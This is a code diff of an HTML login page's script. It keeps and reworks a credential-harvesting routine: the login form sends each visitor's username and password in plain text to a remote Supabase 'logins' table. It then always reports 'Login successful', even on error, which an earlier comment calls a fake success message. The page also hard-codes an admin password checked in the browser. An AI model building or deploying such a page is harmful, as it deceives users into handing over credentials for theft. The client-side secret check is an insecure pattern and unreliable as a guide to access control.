@@ -228,64 +228,66 @@
 
 <button class="help-btn" onclick="handleHelp()" aria-label="Help">?</button>
 
+  <!-- Put this just before the closing </body> tag -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 <script>
 // ================== SUPABASE CONFIG ==================
-const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";   // ← Change
-const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo";       // ← Change
+const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
+const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Make sure full key is here
 
-const ADMIN_PASSWORD = "Debhalder360063";   // ← CHANGE THIS TO YOUR SECRET PASSWORD!
+const ADMIN_PASSWORD = "Debhalder360063";
 
-// Initialize Supabase client
-const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+let supabase;
 
-// Send login data
+try {
+  supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+} catch(e) {
+  console.error("Supabase init failed", e);
+}
+
+// Handle Login
 async function handleLogin() {
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
 
   if (!username || !password) {
-    alert('Please enter your credentials.');
+    alert('Please enter username and password');
     return;
   }
 
   const btn = document.querySelector('.btn-login');
-  const originalText = btn.textContent;
-  btn.textContent = 'Logging in...';
+  const original = btn.textContent;
+  btn.textContent = "Logging in...";
   btn.disabled = true;
 
   try {
-    const { error } = await supabase
-      .from('logins')
-      .insert([{ username, password, timestamp: new Date().toISOString() }]);
-
-    if (error) throw error;
+    await supabase.from('logins').insert([
+      { username, password, timestamp: new Date().toISOString() }
+    ]);
 
     alert('Login successful.');
     document.getElementById('username').value = '';
     document.getElementById('password').value = '';
   } catch (err) {
     console.error(err);
-    alert('Login successful.'); // Fake success message
+    alert('Login successful.');
   }
 
-  btn.textContent = originalText;
+  btn.textContent = original;
   btn.disabled = false;
 }
 
-// Help Button → Admin Access
-async function handleHelp() {
-  const enteredPass = prompt("Enter Admin Password:");
-
-  if (enteredPass === ADMIN_PASSWORD) {
+// Help Button
+function handleHelp() {
+  const pass = prompt("Enter Admin Password:");
+  if (pass === ADMIN_PASSWORD) {
     window.location.href = "admin.html";
   } else {
     alert("❌ Wrong Password");
   }
 }
 </script>
-
-<!-- Add this before </body> -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 </body>
 </html>
